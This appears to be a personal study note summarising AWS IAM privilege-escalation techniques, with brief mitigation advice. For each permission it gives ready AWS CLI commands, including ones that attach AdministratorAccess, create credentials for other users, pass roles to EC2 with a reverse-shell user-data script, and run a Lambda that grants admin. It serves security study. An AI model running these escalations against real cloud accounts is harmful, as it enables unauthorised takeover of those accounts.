# AWS Deep Dive

author:: Nathan Acks  
date:: 2022-09-27

# AWS IAM Privilege Escalation: Methods and Mitigation

Almost all of these issues boil down to "users with admin-like privileges can do admin-like things".

The primary mitigation against these attacks is to aggressively restrict what resources permissions can be used on. This doesn't *completely* mitigate the issue, since some of these resource/permission combinations may still be dangerous, but it's really the only way to reduce the attack surface.

IAM policy variables can help here *a lot*. The aws:username and aws:SourceIp variables are particularly helpful restrictions (aws:username will often be redundant when everything is going *right*, but having that restriction in the policy will essentially prevent the policy reassignment attacks discussed below and allow dangerous permissions to be scoped so that users can only act on themselves).

* [AWS IAM Privilege Escalation - Methods and Mitigation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [IAM policy elements: Variables and tags](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_variables.html)

## New Policy Versions

Users with the iam:CreatePolicyVersion permission can not only create new versions of existing policies (with whatever permissions they desire), but also replace existing versions of that policy (but *only* if they do so on policy creation). Example:

```bash
aws iam create-policy-version --policy-arn $TARGET_POLICY_ARN \
	--policy-document $POLICY_JSON_FILE --set-as-default
```

## Change the Default Version of an Existing Policy

Users with the iam:SetDefaultPolicyVersion permission can roll back (or forward) policies to new versions. Example:

```bash
aws iam set-default-policy-version --policy-arn $TARGET_POLICY_ARN \
	--version-id $POLICY_ID_TO_USE
```

## Create an EC2 Instance With an Existing Profile

Users with both iam:PassRole and ec2:RunInstances can spin up a new EC2 instance they have access to using any existing instance profile. The user can then use the AWS keys associated with this instance to gain permission to perform any action the instance can. Example:

```bash
aws ec2 run-instances --image-id $IMAGE_ID \
	--instance-type $INSTANCE_TYPE \
	--iam-instance-profile Name=$TARGET_INSTANCE_PROFILE \
	--user-data $REVERSE_SHELL_SCRIPT
```

Note that GuardDuty will trigger if EC2 instance keys are used outside of the instance itself.

## Create a User Access Key

Users with the iam:CreateAccessKey permission can create  (and then view) access keys. If this permission is applied to *other* users, then the malicious user can use this to effectively escalate their own privileges (by acting as another use with more extensive permissions). Example:

```bash
aws iam create-access-key --user-name $TARGET_USER
```

Note that users can have at most two sets of access keys associated with them.

## Create New Login Profiles

A user with the iam:CreateLoginProfile permission on *other* users can create a password for users that have not yet logged into the AWS Console, thus assuming their identity. Example:

```bash
aws iam create-login-profile --user-name $TARGET_USER \
	--password $NEW_PASSWORD --no-password-reset-required
```

This is a pretty targeted attack that requires a lot of special conditions, so I'm not sure how much of a risk it really is.

## Update an Existing Login Profile

Same as the above, but allows a user with the iam:UpdateLoginProfile permission on *other* users to assume their identities *after* they've already logged in. Example:

```bash
aws iam update-login-profile --user-name $TARGET_USER \
	--password $NEW_PASSWORD --no-password-reset-required
```

This seems like a more realistic thing to worry about than the last vulnerability.

## Attach a Policy to a User

The iam:AttachUserPolicy permission allows policies to be attached to *other* users. Including themselves. Example:

```bash
aws iam attach-user-policy --user-name $TARGET_USER \
	--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

(Sure, an attacker could use any `$POLICY_ARN` here, but why not go for admin if you can get it? Which you can in this situation.)

## Attach a Policy to a Group

The iam:AttachGroupPolicy permission allows for a similar scenario as the above, but for groups rather than users. Example:

```bash
aws iam attach-group-policy --group-name $TARGET_GROUP \
	--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Attach a Policy to a Role

The iam:AttachRolePolicy permission allows for a scenario like the last two, but for roles. Example:

```bash
aws iam attach-role-policy --role-name $TARGET_ROLE \
	--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Note that the attacker needs to control a user who has the sts:AssumeRole permission for that role in order to take advantage of this one.

## Set an Inline Policy for a User

The iam:PutUserPolicy permission allows an attack like attaching a policy to a user, except that an inline policy is written to that user instead. Example:

```bash
aws iam put-user-policy --user-name $TARGET_USER \
	--policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
```

## Set an Inline Policy for a Group

You can guess what the iam:PutGroupPolicy lets you do by this point. Example:

```bash
aws iam put-group-policy --group-name $TARGET_GROUP \
	--policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
```

## Set an Inline Policy for a Role

Another obvious one. Requires the iam:PutRolePolicy permission. Example:

```bash
aws iam put-role-policy --role-name $TARGET_ROLE \
	--policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
```

As with other role-based privilege escalation routes, also requires that the user have the sts:AssumeRole permission for `$TARGET_ROLE`.

## Add a User to a Group

Add yourself to a privileged group with the iam:AddUserToGroup permission! Example:

```bash
aws iam add-user-to-group --group-name $TARGET_GROUP \
	--user-name $TARGET_USER
```

## Update a Role's AssumeRolePolicyDocument

A user with *both* the iam:UpdateAssumeRolePolicy and the sts:AssumeRole permission can update the assumer role policy document for any role, allowing them to assume it. Example:

```bash
aws iam update-assume-role-policy --role-name $TARGET_ROLE \
	--policy-document $ASSUME_ROLE_POLICY_JSON
```

It seems like this trick really only works if the user's sts:AssumeRole permission is already quite broad.

## Pass a Role to a Lambda Function

Okay, now things are getting interesting. The attackin user need the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions. The idea is to pass a role (*any* role they want) to a Lambda new Lambda function that is configured to exploit the permissions of that role.

For example, the following Python code will promote the target user to full admin access, assuming that the Lambda function is passed a role that permits it to attach policies.

```python
import boto3

def lambda_handler(event, context):

client = boto3.client("iam")

response = client.attach_user_policy(
	UserName="TARGET_USER",
	PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
)

return response
```

This code can then be exploited using two AWS CLI commands:

```bash
# Create the Lambda function
#
aws lambda create-function --function-name $FUNCTION_NAME \
	--runtime python3.6 --role $LAMBDA_ROLE_ARN_TO_PASS \
	--handler $FUNCTION_NAME.lambda_handler --code $PATH_TO_PYTHON_CODE

# Invoke the Lambda function
#
aws lambda invoke --function-name $FUNCTION_NAME $OUTPUT_FILE
```

Basically, this is a way to exploit any role that can be passed to a Lambda function that has one of the other vulnerabilities in this list.

## Pass a Role to a Lambda Function Triggered with DynamoDB

Now we're getting into Rube Goldberg territory. Requires the user to have the iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping permissions (but *not* lambda:InvokeFunction). The idea is the same as above, but rather than calling the function directly the function is attached to a suitable DynamoDB table event stream and triggered by a change in that table.

If no suitable DynamoDB table is available, then the dynamodb:CreateTable permission is required to make one. In this case the dynamodb:PutItem permission is probably also required to trigger the Lambda function (also useful for impatient attackers who are using existing but relatively inactive tables).

Attaching a Lambda function to a DynamoDB table's event stream looks like the following:

```bash
aws lambda create-event-source-mapping \
	--function-name $FUNCTION_NAME \
	--event-source-arn $ARN_OF_DYNAMODB_TABLE_STREAM \
	--enabled --starting-position LATEST
```

## Update an Existing Lambda Function

An attacker with the lambda:UpdateFunctionCode permission can update an existing Lambda function, effectively gaining the permissions of whatever IAM role is attached to it. Example:

```bash
aws lambda update-function-code --function-name $TARGET_FUNCTION \
	--zip-file $ZIP_FILE_WITH_LAMBDA_CODE
```

(A zip file is used here on the assumption that an existing Lambda function is probably a lot more complex than the short code snippet presented previously. But that could also be used instead.)

## Pass a Role to Glue Dev Endpoint

The combination of the iam:PassRole and glue:CreateDevEndpoint permissions creates a situation that is virtually identical to the EC2 instance attack described near the beginning. The only real difference is that an SSH key *must* be used here, but it can conveniently be specified at the command line (rather than having to be uploaded separately into AWS). Example:

```bash
aws glue create-dev-endpoint --endpoint-name $ENDPOINT_NAME \
	--role-arn $ROLE_ARN_TO_PASS --public-key $PATH_TO_SSH_PUBLIC_KEY
```

## Update an Existing Glue Dev Endpoint

This one just needs the glue:UpdateDevEndpoint permission. With this, an attacker can update the SSH key associated with an existing Glue endpoint, gaining access to the system (and hence its associated role). Example:

```bash
aws glue --endpoint-name $TARGET_ENDPOINT \
	--public-key $PATH_TO_SSH_PUBLIC_KEY
```

## Pass a Role to CloudFormation

This one needs the combination of iam:PassRole and cloudformation:CreateStack. It's basically like the EC2 and Glue attacks, except because CloudFormation is an automation service, there's really no need for the attacker to log in - the template file can direct the created AWS resources to perform whatever actions the attacker wishes (and the passed in role allows). Example:

```bash
aws cloudformation create-stack --stack-name $STACK_NAME \
	--template-url $TEMPLATE_URL --role-arn $ROLE_ARN_TO_PASS
```

Note that the `$TEMPLATE_URL` can be hosted *anywhere*.

## Pass a Role to Data Pipeline

Data Pipeline is another automation service, and with the iam:passRole, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions it can be exploited in a similar fashion to CloudFormation. The main difference here is that the attacker will probably use the pipeline to execute AWS CLI commands, rather than orchestrating larger gobs of AWS resources (as with CloudFormation). Example:

```bash
# Create an empty data pipeline
#
aws datapipeline create-pipeline --name $PIPELINE_NAME --unique-id $UUID

# Add a malicious action to the pipeline
#
aws datapipeline put-pipeline-definition --pipeline-id $UUID \
	--pipeline-definition $PATH_TO_MALICIOUS_PIPELINE_DEFINITION_JSON
```
